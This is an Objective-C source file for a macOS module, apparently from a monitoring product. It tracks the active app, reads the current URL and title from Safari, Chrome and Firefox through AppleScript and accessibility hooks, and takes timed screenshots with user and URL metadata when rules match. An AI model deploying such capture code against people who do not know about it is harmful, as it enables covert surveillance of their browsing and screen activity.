//
//  AppScreenShot.m
//  AppScreenShotManager
//
//  Created by ophat on 4/1/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "AppScreenShot.h"
#import "AppScreenRule.h"
#import "FirefoxURLDetector.h"
#import "firefox.h"
#import "SystemUtilsImpl.h"

#import "FxAppScreenShotEvent.h"
#import "DateTimeFormat.h"

@implementation AppScreenShot
@synthesize mSavePath;
@synthesize mIsContainSafariSnapShot;
@synthesize mIsContainChromeSnapShot;
@synthesize mIsContainFirefoxSnapShot;
@synthesize mIsAppScreenStarted;
@synthesize mRules;
@synthesize mListOfApplication;
@synthesize mSnapShotTimer;

@synthesize mActiveAppID, mActiveAppName, mActiveAppUrl, mActiveAppTitle, mActiveAppType;

@synthesize mPageURLSafari;
@synthesize mPageURLFirefox;
@synthesize mPageURLChrome;

@synthesize mObserver1;
@synthesize mObserver2;
@synthesize mObserver3;
@synthesize mLoop1;
@synthesize mLoop2;
@synthesize mLoop3;
@synthesize mProcess1;
@synthesize mProcess2;
@synthesize mProcess3;

@synthesize mSafariSleepTime;
@synthesize mChromeSleepTime;
@synthesize mFirefoxSleepTime;

@synthesize mThread;
@synthesize mDelegate,mSelector;

NSString * kAppScreenShotSafariBundleID         = @"com.apple.Safari";
NSString * kAppScreenShotFirefoxBundleID        = @"org.mozilla.firefox";
NSString * kAppScreenShotGoogleChromeBundleID   = @"com.google.Chrome";

const int kAppDeactive      = 0;
const int kAppActive        = 1;
const int kAppChangeTitle   = 2;
const int kAppTerminate     = 3;

-(id) init{
    if (self == [super init]) {
        mRules = [[NSMutableArray alloc]init];
        mListOfApplication = [[NSMutableArray alloc]init];
        mSafariSleepTime = 2;
        mChromeSleepTime = 2;
        mFirefoxSleepTime = 2;
        mFirefoxURLDetector = [[FirefoxURLDetector alloc] init];
    }
    return self;
}

-(void) setRule:(AppScreenRule *)aRule{
    if ([aRule mAppType] == 1 && ([[aRule mApplicationID] isEqualToString:kAppScreenShotSafariBundleID])) {
        self.mIsContainSafariSnapShot = YES;
    }else if ([aRule mAppType] == 1 && ([[aRule mApplicationID] isEqualToString:kAppScreenShotGoogleChromeBundleID])) {
        self.mIsContainChromeSnapShot = YES;
    }else if ([aRule mAppType] == 1 && ([[aRule mApplicationID] isEqualToString:kAppScreenShotFirefoxBundleID])) {
        self.mIsContainFirefoxSnapShot = YES;
    }

    [mListOfApplication addObject:[aRule mApplicationID]];
    [mRules addObject:aRule];
}

-(void) startCapture{
    DLog(@"#### AppScreenShot StartCapture");
    if ([mRules count] >0) {
        self.mIsAppScreenStarted = YES;
        [self registerNotification];
    }else{
        DLog(@"No Rule No go");
    }
    
}
-(void) stopCapture{
     self.mIsAppScreenStarted = NO;
    [self unregisterNotification];
    
    if (mSnapShotTimer) {
        [mSnapShotTimer invalidate];
        mSnapShotTimer = nil;
    }
    [mListOfApplication removeAllObjects];
    [mRules removeAllObjects];
}

-(void) registerNotification{
    [self unregisterNotification];

    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseActive:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseDeactive:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseLaunch:)  name:NSWorkspaceDidLaunchApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(appNotifyCaseTerminate:)  name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
}

-(void) unregisterNotification{

    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
    [self unRegisterPageEventSafari];
    [self unRegisterPageEventFirefox];
    [self unRegisterPageEventChrome];
}

-(void)appNotifyCaseLaunch:(NSNotification *)notification{
    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if (mIsContainSafariSnapShot) {
        if ([appBundleIdentifier isEqualToString:kAppScreenShotSafariBundleID]) {
            mSafariSleepTime = 2;
        }
    }
    if (mIsContainChromeSnapShot) {
        if ([appBundleIdentifier isEqualToString:kAppScreenShotGoogleChromeBundleID]){
            mChromeSleepTime = 2;
        }
    }
    if (mIsContainFirefoxSnapShot) {
        if ([appBundleIdentifier isEqualToString:kAppScreenShotFirefoxBundleID]){
            mFirefoxSleepTime = 2;
        }
    }
}

-(void)appNotifyCaseActive:(NSNotification *)notification{
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    BOOL isBrowserApp = NO;
    if (mIsContainSafariSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotSafariBundleID]) {
            [self registerPageEventSafari];
            [self appScreenShotTitleChangeCallBack];
            isBrowserApp = YES;
        }
    }
    if (mIsContainChromeSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotGoogleChromeBundleID]){
            [self registerPageEventChrome];
            [self appScreenShotTitleChangeCallBack];
            isBrowserApp = YES;
        }
    }
    if (mIsContainFirefoxSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotFirefoxBundleID]){
            [self registerPageEventFirefox];
            [self appScreenShotTitleChangeCallBack];
            isBrowserApp = YES;
        }
    }
    if (!isBrowserApp) {
        [self checkIsValidToSnapWithURL:nil AppID:[runningapp bundleIdentifier] action:kAppActive];
    }
}

-(void)appNotifyCaseDeactive:(NSNotification *)notification{
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    if (mIsContainSafariSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotSafariBundleID]) {
            [self unRegisterPageEventSafari];
        }
    }
    if (mIsContainChromeSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotGoogleChromeBundleID]){
            [self unRegisterPageEventChrome];
        }
    }
    if (mIsContainFirefoxSnapShot) {
        if ([[runningapp bundleIdentifier]isEqualToString:kAppScreenShotFirefoxBundleID]){
            [self unRegisterPageEventFirefox];
        }
    }
    [self checkIsValidToSnapWithURL:nil AppID:[runningapp bundleIdentifier] action:kAppDeactive];
}

-(void)appNotifyCaseTerminate:(NSNotification *)notification{
    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if (mIsContainSafariSnapShot) {
        if ([appBundleIdentifier isEqualToString:kAppScreenShotSafariBundleID]) {
            [self unRegisterPageEventSafari];
            mSafariSleepTime = 2;
        }
    }
    if (mIsContainChromeSnapShot) {
        if([appBundleIdentifier isEqualToString:kAppScreenShotGoogleChromeBundleID]){
            [self unRegisterPageEventChrome];
            mChromeSleepTime = 2;
        }
    }
    if (mIsContainFirefoxSnapShot) {
        if ([appBundleIdentifier isEqualToString:kAppScreenShotFirefoxBundleID]){
            [self unRegisterPageEventFirefox];
            mFirefoxSleepTime = 2;
        }
    }
    [self checkIsValidToSnapWithURL:nil AppID:appBundleIdentifier action:kAppTerminate];
}

-(void) registerPageEventSafari{
    int counter = 4;
    [NSThread sleepForTimeInterval:mSafariSleepTime];
    BOOL isRegister = false;
    while (!isRegister) {
        NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:kAppScreenShotSafariBundleID];
        if ([checker count]>0) {
            NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Safari\")\n end tell"];
            NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
            int myPid = [[Result stringValue] intValue];
            [scptFrontmost release];
            pid_t pid = myPid;
            
            mProcess1 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, appScreenShot_AXObserverCallback, &mObserver1);
            mLoop1 = CFRunLoopGetCurrent();
            
            if ([SystemUtilsImpl isOSX_VersionEqualOrGreaterMajorVersion:10 minorVersion:10]) {
                DLog(@"GreaterOrEqual isOSX_10_10");
                AXObserverAddNotification(mObserver1, mProcess1,CFSTR("AXTitleChanged"), self);
            }else if ([SystemUtilsImpl isOSX_10_9]) {
                DLog(@"isOSX_10_9");
                AXObserverAddNotification(mObserver1, mProcess1,CFSTR("AXValueChanged"), self);
            }
            
            CFRunLoopAddSource(mLoop1, AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Safari");
            isRegister = true;
            mSafariSleepTime = 0.2;
        }
        [NSThread sleepForTimeInterval:0.2];
        if (counter == 0) {
            break;
        }
        counter--;
    }
    if (!isRegister) {
        DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
    }
}
-(void) registerPageEventChrome{
    int counter = 4;
    [NSThread sleepForTimeInterval:mChromeSleepTime];
    BOOL isRegister = false;
    while (!isRegister) {
        NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:kAppScreenShotGoogleChromeBundleID];
        if ([checker count]>0) {
            NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Google Chrome\")\n end tell"];
            NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
            int myPid = [[Result stringValue] intValue];
            [scptFrontmost release];
            pid_t pid = myPid;
            
            mProcess2 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, appScreenShot_AXObserverCallback, &mObserver2);
            mLoop2 = CFRunLoopGetCurrent();
            AXObserverAddNotification(mObserver2, mProcess2,CFSTR("AXTitleChanged"), self);
            
            CFRunLoopAddSource(mLoop2, AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Chrome");
            isRegister = true;
            mChromeSleepTime = 0.2;
        }
        [NSThread sleepForTimeInterval:0.2];
        if (counter == 0) {
            break;
        }
        counter--;
    }
    if (!isRegister) {
        DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
    }
}

-(void) registerPageEventFirefox{
    int counter = 4;
    [NSThread sleepForTimeInterval:mFirefoxSleepTime];
    BOOL isRegister = false;
    while (!isRegister) {
        NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:kAppScreenShotFirefoxBundleID];
        if ([checker count]>0) {
            NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Firefox\")\n end tell"];
            NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
            int myPid = [[Result stringValue] intValue];
            [scptFrontmost release];
            pid_t pid = myPid;
            
            mProcess3 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, appScreenShot_AXObserverCallback, &mObserver3);
            mLoop3 = CFRunLoopGetCurrent();
            AXObserverAddNotification(mObserver3, mProcess3,CFSTR("AXTitleChanged"), self);
            
            CFRunLoopAddSource(mLoop3, AXObserverGetRunLoopSource(mObserver3), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Firefox");
            isRegister = true;
            mFirefoxSleepTime = 0.2;
        }
        [NSThread sleepForTimeInterval:0.2];
        if (counter == 0) {
            break;
        }
        counter--;
    }
    if (!isRegister) {
        DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
    }
    
}
-(void) unRegisterPageEventSafari{
    if ( mObserver1 != nil ) {
        DLog(@"unRegisterPageEventSafari");
        AXObserverRemoveNotification(mObserver1, mProcess1, CFSTR("AXTitleChanged"));
        
        CFRunLoopRemoveSource(mLoop1, AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
        mLoop1 = nil;
        mObserver1 = nil;
        mProcess1 = nil;
    }
}
-(void) unRegisterPageEventChrome{
    if ( mObserver2 != nil ) {
        DLog(@"unRegisterPageEventChrome");
        AXObserverRemoveNotification(mObserver2, mProcess2, CFSTR("AXTitleChanged"));
        
        CFRunLoopRemoveSource(mLoop2, AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
        mLoop2 = nil;
        mObserver2 = nil;
        mProcess2 = nil;
    }
}
-(void) unRegisterPageEventFirefox{
    if (mObserver3 != nil && mLoop3 != nil && mProcess3 != nil) {
        DLog(@"unRegisterPageEventFirefox");
        AXObserverRemoveNotification(mObserver3, mProcess3, CFSTR("AXTitleChanged") );
        
        CFRunLoopRemoveSource(mLoop3, AXObserverGetRunLoopSource(mObserver3), kCFRunLoopDefaultMode);
        mLoop3 = nil;
        mObserver3 = nil;
        mProcess3 = nil;
    }
}

void appScreenShot_AXObserverCallback( AXObserverRef observer, AXUIElementRef element, CFStringRef notificationName, void * contextData ){
    CFTypeRef _title;
    if (AXUIElementCopyAttributeValue(element, (CFStringRef)NSAccessibilityTitleAttribute, (CFTypeRef *)&_title) == kAXErrorSuccess) {
        NSString *title = [NSString stringWithFormat:@"%@",_title];
        if([title length]>0){
            AppScreenShot *mySelf = (AppScreenShot *)contextData;
            [mySelf appScreenShotTitleChangeCallBack];
        }
    }
    if (_title != NULL){
        CFRelease(_title);
    }
}
-(void) appScreenShotTitleChangeCallBack{
    @try{
        
        NSString * frontMostName = @"";
        NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n item 1 of (get name of processes whose frontmost is true) \n end tell"];
        NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
        frontMostName = [[Result stringValue] copy];
        [scptFrontmost release];
        if ([frontMostName isEqualToString:@"Safari"]){
            
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
            NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
            
            [self checkIsValidToSnapWithURL:[[scptResult descriptorAtIndex:1]stringValue] AppID:kAppScreenShotSafariBundleID action:kAppChangeTitle];
            
            [scpt release];
        }
        if ([frontMostName isEqualToString:@"Google Chrome"]){
            
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
            NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
            
            [self checkIsValidToSnapWithURL:[[scptResult descriptorAtIndex:1]stringValue] AppID:kAppScreenShotGoogleChromeBundleID action:kAppChangeTitle];

            [scpt release];
        }
        if ([frontMostName isEqualToString:@"firefox"]){
            
            @try {
                FirefoxApplication *firefoxApp = [SBApplication applicationWithBundleIdentifier:kAppScreenShotFirefoxBundleID];
                NSString *title = [[[[firefoxApp windows] get] firstObject] name];
                NSString *url = [mFirefoxURLDetector urlWithTitle:title];
                if (url) {
                    [self checkIsValidToSnapWithURL:url AppID:kAppScreenShotFirefoxBundleID action:kAppChangeTitle];
                } else {
                    NSDictionary *urlInfo = [mFirefoxURLDetector lastUrlInfo];
                    title = [urlInfo objectForKey:@"title"];
                    url = [urlInfo objectForKey:@"url"];
                    if (url) {
                        [self checkIsValidToSnapWithURL:url AppID:kAppScreenShotFirefoxBundleID action:kAppChangeTitle];
                    }
                }
            }
            @catch (NSException *e) {
                DLog(@"------> PageVisited Firefox url title exception, %@", e);
            }
            @catch (...) {
                DLog(@"------> PageVisited Firefox url title unknow exception...");
            }
        }
    }@catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
}

-(NSString *)getTitleOfWindowFromAppID:(NSString *)aAppID {
    NSArray * ArrayTarget = [NSRunningApplication runningApplicationsWithBundleIdentifier:aAppID];
    if ([ArrayTarget count] > 0) {
        NSRunningApplication * target = [ArrayTarget objectAtIndex:0];
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:[NSString stringWithFormat:@"delay 1 \n set frontAppName to \"%@\" \n tell application \"System Events\" \n tell process frontAppName \n tell (1st window whose value of attribute \"AXMain\" is true) \n return value of attribute \"AXTitle\" \n end tell \n end tell \n end tell",[target localizedName]]];
        NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
        [scpt release];
        return [scptResult stringValue];
    }
    return @"";
}
-(void) checkIsValidToSnapWithURL:(NSString *)aUrl AppID:(NSString *)aAppID action:(int)aAction{

    if ([mListOfApplication containsObject:aAppID]) {
        if (aAction == kAppActive || aAction == kAppChangeTitle) {
            
            NSString * appTitle = [self getTitleOfWindowFromAppID:aAppID];
            NSString * appName = @"";
            NSArray * list =  [NSRunningApplication runningApplicationsWithBundleIdentifier:aAppID];
            if (list) {
                appName = [[list objectAtIndex:0] localizedName];
            }
            
            DLog(@"AppID %@ AppName %@ appTitle %@ URL %@  Action %d",aAppID,appName,appTitle,aUrl,aAction);
            
            int index = -1;
            for (int i = 0; i<[mRules count]; i++) {
                if ([[[mRules objectAtIndex:i]mApplicationID]isEqualToString:aAppID]) {
                    index = i;
                }
            }
            
            if (index != -1) {
                if ([[mRules objectAtIndex:index]mAppType] == kBrowser) {
                    DLog(@"### Browser");

                    NSMutableArray * paramRule = [[mRules objectAtIndex:index] mParameter];
                    if ([paramRule count] > 0) {
                        BOOL noRuleMatched = YES;
                        for (int i=0 ; i < [paramRule count]; i++) {
                            if ([aUrl  rangeOfString:[[paramRule objectAtIndex:i] mDomainName]].location != NSNotFound) {
                                //Set Title
                                if ([[[paramRule objectAtIndex:i] mTitle] length] > 0) {
                                    if ([appTitle  rangeOfString:[[paramRule objectAtIndex:i] mTitle]].location != NSNotFound) {
                                        noRuleMatched = NO;
                                        if (![mActiveAppID isEqualTo:aAppID]) {
                                            if (mSnapShotTimer) {
                                                DLog(@"Old mSnap is killed : %@",self.mActiveAppID);
                                                [mSnapShotTimer invalidate];
                                                self.mSnapShotTimer = nil;
                                            }
                                            self.mActiveAppID    = aAppID;
                                            self.mActiveAppName  = appName;
                                            self.mActiveAppTitle = appTitle;
                                            self.mActiveAppType  = kBrowser;
                                            self.mActiveAppUrl   = aUrl;
                                        }
                                        
                                        if (!mSnapShotTimer ){
                                            DLog(@"Snap every %d",[[mRules objectAtIndex:index]mFrequency]);
                                            self.mSnapShotTimer = [NSTimer scheduledTimerWithTimeInterval:[[mRules objectAtIndex:index]mFrequency] target:self selector:@selector(snapAndSend) userInfo:nil repeats:YES];
                                            [mSnapShotTimer fire]; // Yolo Start
                                        }
                                        break;
                                    }
                                }else{
                                    noRuleMatched = NO;
                                    if (![mActiveAppID isEqualTo:aAppID]) {
                                        if (mSnapShotTimer) {
                                            DLog(@"Old mSnap is killed : %@",self.mActiveAppID);
                                            [mSnapShotTimer invalidate];
                                            self.mSnapShotTimer = nil;
                                        }
                                        self.mActiveAppID    = aAppID;
                                        self.mActiveAppName  = appName;
                                        self.mActiveAppTitle = appTitle;
                                        self.mActiveAppType  = kBrowser;
                                        self.mActiveAppUrl   = aUrl;
                                    }
                                    
                                    if (!mSnapShotTimer ){
                                        DLog(@"Snap every %d",[[mRules objectAtIndex:index]mFrequency]);
                                        self.mSnapShotTimer = [NSTimer scheduledTimerWithTimeInterval:[[mRules objectAtIndex:index]mFrequency] target:self selector:@selector(snapAndSend) userInfo:nil repeats:YES];
                                        [mSnapShotTimer fire]; // Yolo Start
                                    }
                                    break;
                                }
                            }
                        }
                        if (noRuleMatched) {
                            if (mSnapShotTimer) {
                                DLog(@"mSnap is killed of %@ url %@ title %@",self.mActiveAppID,aUrl,appTitle);
                                [mSnapShotTimer invalidate];
                                self.mSnapShotTimer = nil;
                            }
                        }
                    }

                }else if ([[mRules objectAtIndex:index]mAppType] == kNon_Browser ) {
                    DLog(@"### NoN-Browser");
                    BOOL isTitleMatched = NO;
                    NSMutableArray * paramRule = [[mRules objectAtIndex:index] mParameter];
                    if ([paramRule count] > 0) {
                        for (int i=0 ; i < [paramRule count]; i++) {
                            if ([appTitle  rangeOfString:[[paramRule objectAtIndex:i] mTitle]].location != NSNotFound) {
                                isTitleMatched = YES;
                            }
                        }
                    }else {
                        isTitleMatched = YES;
                    }
                    if (isTitleMatched) {
                        if (![mActiveAppID isEqualTo:aAppID]) {
                            if (mSnapShotTimer) {
                                DLog(@"Old mSnap is killed : %@",self.mActiveAppID);
                                [mSnapShotTimer invalidate];
                                self.mSnapShotTimer = nil;
                            }
                            self.mActiveAppID    = aAppID;
                            self.mActiveAppName  = appName;
                            self.mActiveAppTitle = appTitle;
                            self.mActiveAppType  = kNon_Browser;
                            self.mActiveAppUrl   = aUrl;
                        }
                    
                        if (!mSnapShotTimer) {
                            DLog(@"Snap every %d",[[mRules objectAtIndex:index]mFrequency]);
                            self.mSnapShotTimer = [NSTimer scheduledTimerWithTimeInterval:[[mRules objectAtIndex:index]mFrequency] target:self selector:@selector(snapAndSend) userInfo:nil repeats:YES];
                            [mSnapShotTimer fire]; // Yolo Start
                        }
                    }else{
                        if (mSnapShotTimer) {
                            DLog(@"mSnap is killed of %@ Title %@",self.mActiveAppID,appTitle);
                            [mSnapShotTimer invalidate];
                            self.mSnapShotTimer = nil;
                        }
                    }
                }
            }
        }else if (aAction == kAppDeactive || aAction == kAppTerminate) {
            if ([mActiveAppID isEqualTo:aAppID]) {
                if (mSnapShotTimer) {
                    DLog(@"Old mSnap is killed : %@",self.mActiveAppID);
                    [mSnapShotTimer invalidate];
                    self.mSnapShotTimer = nil;
                }
            }
        }
    }
}

-(void) snapAndSend {
    BOOL isActive = NO;
    NSArray * app = [NSRunningApplication runningApplicationsWithBundleIdentifier:mActiveAppID];
    if (app) {
        NSRunningApplication * target = [app objectAtIndex:0];
        isActive = [target isActive];
    }
    
    if ([mDelegate respondsToSelector:mSelector] && isActive) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

            NSImage *screenshot = [SystemUtilsImpl takeScreenshotFrontWindowWithBundleIDUsingAppleScript:mActiveAppID];
            if (screenshot) {
                
                NSData *tiffData = [screenshot TIFFRepresentation];
                NSBitmapImageRep *bitmap = [NSBitmapImageRep imageRepWithData:tiffData];
                [bitmap setSize:[screenshot size]];
                NSData *pngData = [bitmap representationUsingType:NSPNGFileType properties:nil];
                NSString * savePath = [NSString stringWithFormat:@"%@%@.png",mSavePath,[NSDate date]];
                [pngData writeToFile:savePath atomically:YES];
 
                FxAppScreenShotEvent * ASSEvent = [[FxAppScreenShotEvent alloc]init];
                [ASSEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                [ASSEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                [ASSEvent setMApplicationID:mActiveAppID];
                [ASSEvent setMApplicationName:mActiveAppName];
                [ASSEvent setMTitle:mActiveAppTitle];
                [ASSEvent setMApplication_Catagory:mActiveAppType];
                [ASSEvent setMUrl:mActiveAppUrl];
                [ASSEvent setMScreenshotFilePath:savePath];
                
                DLog(@"===================== snapAndSend =======================");
                DLog(@"dateTime: %@", [ASSEvent dateTime]);
                DLog(@"mUserLogonName: %@", [ASSEvent mUserLogonName]);
                DLog(@"mApplicationID: %@", [ASSEvent mApplicationID]);
                DLog(@"mApplicationName: %@", [ASSEvent mApplicationName]);
                DLog(@"mTitle: %@", [ASSEvent mTitle]);
                DLog(@"mApplication_Catagory ID: %d", (int)[ASSEvent mApplication_Catagory]);
                DLog(@"mUrl: %@", [ASSEvent mUrl]);
                DLog(@"mScreenshotFilePath: %@", [ASSEvent mScreenshotFilePath]);

                [mDelegate performSelector:mSelector onThread:mThread withObject:ASSEvent waitUntilDone:NO];
                [ASSEvent release];
                
            } else {
                DLog(@"No Send :> CANNOT take screenshot mActiveAppID: %@",mActiveAppID);
            }
            [pool release];
        });
    }
}

-(void) dealloc{
    [self stopCapture];
    
    [mFirefoxURLDetector release];
    [mPageURLSafari release];
    [mPageURLFirefox release];
    [mPageURLChrome release];
    
    [mSnapShotTimer release];
    [mListOfApplication release];
    [mRules release];
    [super dealloc];
}

@end
